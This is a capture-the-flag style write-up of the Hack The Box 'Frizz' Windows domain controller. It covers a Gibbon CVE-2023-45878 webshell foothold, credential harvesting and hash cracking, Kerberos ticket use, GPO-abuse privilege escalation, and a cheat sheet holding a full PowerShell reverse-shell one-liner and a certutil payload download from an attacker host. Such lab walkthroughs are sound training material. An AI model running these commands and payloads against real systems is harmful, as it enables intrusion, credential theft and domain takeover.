# HTB The Frizz - Writeup (English)

> 🚨 **Follow the HTB grind in real-time — leaks, drops, and deep writeups**  
> 👉 [t.me/nosecpwn](https://t.me/nosecpwn)  
> _Don't read. Join._

**Platform:** Windows\
**IP:** 10.10.11.60

---

## Recon

### NMAP

```
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
| http-title: Education &mdash; Walkerville Elementary School
|_Requested resource was http://frizzdc.frizz.htb/home/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57649/tcp open  msrpc         Microsoft Windows RPC
57653/tcp open  msrpc         Microsoft Windows RPC
57663/tcp open  msrpc         Microsoft Windows RPC
```

Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o\:microsoft\:windows

### SMB + clock-skew

- SMB time/clock-skew: +6h59m (időszinkron kell Kerberoshoz!)

---

### DIRBUSTER / GOBUSTER

```
gobuster dir -u http://frizzdc.frizz.htb -w /usr/share/wordlists/dirb/common.txt

/.htaccess (403)
/.htpasswd (403)
... stb.
/Home   (301)  → http://frizzdc.frizz.htb/Home/
/home   (301)  → http://frizzdc.frizz.htb/home/
```

---

## Web Application Recon / Initial Foothold

**Identified app: GIBBON 25.0.0 (open-source school management system)

- Google: there’s a known CVE, relevant exploit: **CVE-2023-45878**
- Exploit: **Upload reverse shell via webshell**

**Running the exploit script:**

```
bash CVE-2023-45878.sh 10.10.14.52 4444 10.10.11.60:80
```

- Uploads the shell
- Opens: http://10.10.11.60:80/Gibbon-LMS/gibbon_myconfig.php?cmd=whoami
- Start a Netcat/Metasploit listener: 'nc -lnvp 4444' or handler

**Result:** basic reverse shell (command prompt)

---

## First user / credential hunting

**Found file: config.php → **MySQL user/pass**

```
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parr*****';
```

**Login in MySQL:**

```
C:\xampp\mysql\bin> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parr*****" -e "show databases;"
```

- Main DB: `gibbon`
- User table: `gibbonperson`

**Identified user:**

- username: f.frizzle
- password hash + salt

**Password cracking (John):**

```
john --format=dynamic='sha256($s.$p)' --wordlist=/usr/share/wordlists/rockyou.txt fizz.txt
```

- **Result:** Jenni\_Luvs\_*******

---

## Kerberos TGT & User escalation

**Time synchronization (important!):**

```
sudo rdate -n frizzdc.frizz.htb
```

**Getting TGT:**

```
impacket-getTGT frizz.htb/f.frizzle:'Jenni_Luvs_*****' -dc-ip frizzdc.frizz.htb
export KRB5CCNAME=f.frizzle.ccache
```

**SSH login:**

```
ssh f.frizzle@10.10.11.60 -K
```

- **Obtaining user.txt**

---

## Further privesc – backup file / second user

**File:** `wapt-backup-sunday.7z` (f.frizzle Desktop)

- Downloaded via meterpreter or plain HTTP
- Internal password extracted, revealing another **AD user: M.SchoolBus / !suBc**

**Getting TGT for new user:**

```
impacket-getTGT frizz.htb/'M.SchoolBus':'!suBc*****' -dc-ip frizzdc.frizz.htb
export KRB5CCNAME=M.SchoolBus.ccache
```

**SSH login:**

```
ssh M.SchoolBus@10.10.11.60 -K
```

---

## Privesc: GPO abuse to gain SYSTEM privileges

### Creating GPO + GPO abuse

**Create a new GPO:**

```powershell
New-GPO -Name GPO-new | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
```

**Check applied GPOs:**

```powershell
get-GPO -All
```

**Make yourself admin (SharpGPOAbuse):**

```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName GPO-new --force
```

- Wait or run gpupdate /force on the target machine

**Verify admin rights:**

```
net localgroup administrators
```

---

## Gaining SYSTEM / root shell with RunasCs

**Build the RunasCs executable yourself (see the full process in the notes section)**

**Reverse shell payload (PowerShell):**

```powershell
.\RunasCs.exe 'M.schoolbus' '!suBc*****' powershell.exe -r 10.10.14.52:4444
```

- Netcat listener: `nc -lvnp 4444`
- If you need a meterpreter shell, create a payload using msfvenom and launch it with RunasCs

**Obtain root.txt:**

```
type C:\Users\Administrator\Desktop\root.txt
```

---

**Bonus: Custom RunasCs.exe build on Windows (quick workflow)**

1. Download the source: [https://github.com/antonioCoco/RunasCs](https://github.com/antonioCoco/RunasCs)
2. On Windows, install Visual Studio Build Tools (only .NET build is needed)
3. Open the "Developer Command Prompt for VS"
4. Navigate to the RunasCs folder, then:
   ```cmd
   msbuild /p:Configuration=Release
   ```
5. The exe will be located here: `bin\Release\RunasCs.exe`
6. Copy it to a USB stick or upload to a private GitHub repo, then download from Linux

---

# **My notes and takeaways (casual style):**

- **Struggled hard with the shell:** meterpreter session kept dying, but netcat was reliable
- **Everything depends on GPO refresh**: admin chain only takes effect after refresh
- **Building RunasCs on Windows is a must** (no trusted prebuild, always build it yourself)
- **PowerShell reverse shell with netcat is more stable than meterpreter**
- **Pro workflow:** always try multiple shell types, not just msfconsole!
- **Patience game:** 6+ hours, but every minute taught something (privesc, chaining, build, Windows internals)

---

# **Summary / Lessons Learned**

- Always check all user directories (desktop, backup, config)
- Gibbon CVE = easy foothold, but AD privesc is not trivial
- Hash + salt, John, tickets = full AD attack chain
- GPO abuse is key, but refresh and correct OU selection are critical
- If meterpreter doesn't survive, plain PowerShell or netcat shell can still get you SYSTEM
- Building your own tools, moving files, time sync: these are just as important as the “attack” itself

---

# **Related commands, cheat-sheet**

## Hash cracking

```
john --format=dynamic='sha256($s.$p)' --wordlist=/usr/share/wordlists/rockyou.txt fizz.txt
```

## Kerberos ticket retrieval

```
impacket-getTGT frizz.htb/<user>:<pass> -dc-ip frizzdc.frizz.htb
export KRB5CCNAME=<user>.ccache
```

## Check for admin privileges

```
net localgroup administrators
```

## GPO quick refresh

```
gpupdate /force
```

## Shell download with certutil

```
certutil -urlcache -split -f "http://<ip>:<port>/RunasCs.exe" RunasCs.exe
```

## Reverse shell command (PowerShell)

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

---

## **That was the Frizz box! Thanks for grinding through it!**

Nice chain, lots of pain, but even more learning! 🚀
